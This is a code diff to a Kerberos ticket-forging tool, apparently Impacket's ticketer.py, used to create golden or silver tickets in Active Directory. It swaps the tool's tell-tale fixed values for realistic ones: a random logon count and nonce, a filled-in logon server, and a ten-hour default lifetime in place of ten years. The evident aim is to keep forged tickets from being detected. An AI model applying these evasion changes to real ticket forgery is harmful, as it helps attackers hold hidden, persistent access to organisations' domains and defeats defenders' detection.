@@ -182,7 +182,7 @@ class TICKETER:
         kerbdata['ProfilePath'] = ''
         kerbdata['HomeDirectory'] = ''
         kerbdata['HomeDirectoryDrive'] = ''
-        kerbdata['LogonCount'] = 500
+        kerbdata['LogonCount'] = random.randint(20, 9999)
         kerbdata['BadPasswordCount'] = 0
         kerbdata['UserId'] = int(self.__options.user_id)
 
@@ -206,7 +206,7 @@ class TICKETER:
 
         kerbdata['UserFlags'] = 0
         kerbdata['UserSessionKey'] = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
-        kerbdata['LogonServer'] = ''
+        kerbdata['LogonServer'] = self.__server.split('.')[0].upper()
         kerbdata['LogonDomainName'] = self.__domain.upper()
         kerbdata['LogonDomainId'].fromCanonical(self.__options.domain_sid)
         kerbdata['LMKey'] = b'\x00\x00\x00\x00\x00\x00\x00\x00'
@@ -975,7 +975,7 @@ class TICKETER:
         encRepPart['last-req'][0] = noValue
         encRepPart['last-req'][0]['lr-type'] = 0
         encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.now(datetime.timezone.utc))
-        encRepPart['nonce'] = 123456789
+        encRepPart['nonce'] = random.randint(0, 0x7fffffff)
         encRepPart['key-expiration'] = KerberosTime.to_asn1(ticketDuration)
         flags = []
         for i in encTicketPart['flags']:
@@ -1260,8 +1260,8 @@ if __name__ == '__main__':
     parser.add_argument('-extra-pac', action='store_true', help='Populate your ticket with extra PAC (UPN_DNS)')
     parser.add_argument('-old-pac', action='store_true', help='Use the old PAC structure to create your ticket (exclude '
                                                               'PAC_ATTRIBUTES_INFO and PAC_REQUESTOR')
-    parser.add_argument('-duration', action="store", default = '87600', help='Amount of hours till the ticket expires '
-                                                                             '(default = 24*365*10)')
+    parser.add_argument('-duration', action="store", default = '10', help='Amount of hours till the ticket expires '
+                                                                             '(default = 10, matching Windows TGT)')
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
 
